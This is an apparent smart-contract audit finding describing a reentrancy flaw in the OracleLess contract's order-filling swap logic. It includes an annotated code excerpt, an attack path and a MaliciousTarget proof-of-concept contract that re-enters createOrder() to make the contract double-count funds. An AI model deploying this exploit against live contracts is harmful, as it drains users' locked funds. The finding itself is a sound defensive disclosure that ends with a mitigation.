# Reentrancy can be exploited in OracleLess contract

### Summary

`OracleLess` contract inherits `ReentrancyGuard` but none of its function use the nonReentrant modifier. This itself does not directly lead to problems, but in the current implementation, attacker can use the reentrancy to drain funds locked in the contract.
### Root Cause

Possible reentancy + the design to allow arbitrary address and calldata when swapping tokens in `fillOrder()`.

The external call can be to any address with any calldata and this is possible because there are two important checks presented - tokenIn spent is not more than the amount provided by user and the amount out is not less than the expected amount based on current market price. This allows the protocol to call any address when these two requirements are fulfilled.

The problem comes from the possibility to reenter the contract when doing the external call. Doing such external call gives opportunity for the attacker to gain control of execution. 

Adding comments directly to the implementation to describe the issue.
```solidity
function execute(
        address target,
        bytes memory txData,
        uint256 amountIn,
        IERC20 tokenIn,
        IERC20 tokenOut,
        uint16 bips
    ) internal returns (uint256 swapAmountOut, uint256 tokenInRefund) {
        //update accounting
        uint256 initialTokenIn = tokenIn.balanceOf(address(this));
        uint256 initialTokenOut = tokenOut.balanceOf(address(this));


        // Since target can be any address, it can be also a user controlled one:
        tokenIn.safeApprove(target, amountIn);


        // User's contract can invoke createOrder() with tokenIn for that order to be equal to current tokenOut
        (bool success, bytes memory result) = target.call(txData);

		if (!success) {
            revert TransactionFailed(reason);
        }
		// no tokenIn is spent
        uint256 finalTokenIn = order.tokenIn.balanceOf(address(this));
        require(finalTokenIn >= initialTokenIn - order.amountIn, "over spend");
	    // tokenOut balance would be changed because of the newly createdOrder leading to double accounting of funds
        uint256 finalTokenOut = order.tokenOut.balanceOf(address(this));

        require(
            finalTokenOut - initialTokenOut > order.minAmountOut,
            "Too Little Received"
        );

		// this amountOut is equal to the amountIn of the reentrancy created  order
        amountOut = finalTokenOut - initialTokenOut;
        tokenInRefund = order.amountIn - (initialTokenIn - finalTokenIn);
    }
```

### Attack Path

As described in the root cause, the attacker can exploit the `execute()` function by providing a malicious `target` address that reenters the contract via the `createOrder()` functionality:
* The attacker specifies a `target` address and arbitrary `txData` to call the `target`.
* During the execution of `target.call(txData)`, the malicious contract reenters the protocol's functionality, specifically the `createOrder()` function.
* This reentrant call creates a new order, increasing the `tokenOut` balance of the contract.
* After the reentrant `createOrder()` call, the `tokenOut` balance of the contract includes tokens from the new order.
- The function calculates `amountOut` based on the `tokenOut` balance difference:
- Since `finalTokenOut` includes tokens added by the reentrant `createOrder()` call, the protocol double-counts tokens.
### Impact

Loss of funds
### PoC

An example of `target` contract: 

```solidity

contract MaliciousTarget {
    address bracketContract;

    constructor(address _bracketContract) {
        bracketContract = _bracketContract;
    }

    function executeReentrantAttack(
        IERC20 tokenIn,
        IERC20 tokenOut,
        uint256 amountIn,
        uint256 minAmountOut,
        address recipient,
        uint16 feeBips,
        bool permit,
        bytes calldata permitPayload
    ) external {
        // reenter the Bracket contract to create an order
        IBracket(bracketContract).createOrder(
            tokenIn,
            tokenOut,
            amountIn,
            minAmountOut,
            recipient,
            feeBips,
            permit,
            permitPayload
        );
    }
}
```
### Mitigation

Add `nonReentrant` modifiers to the functions.
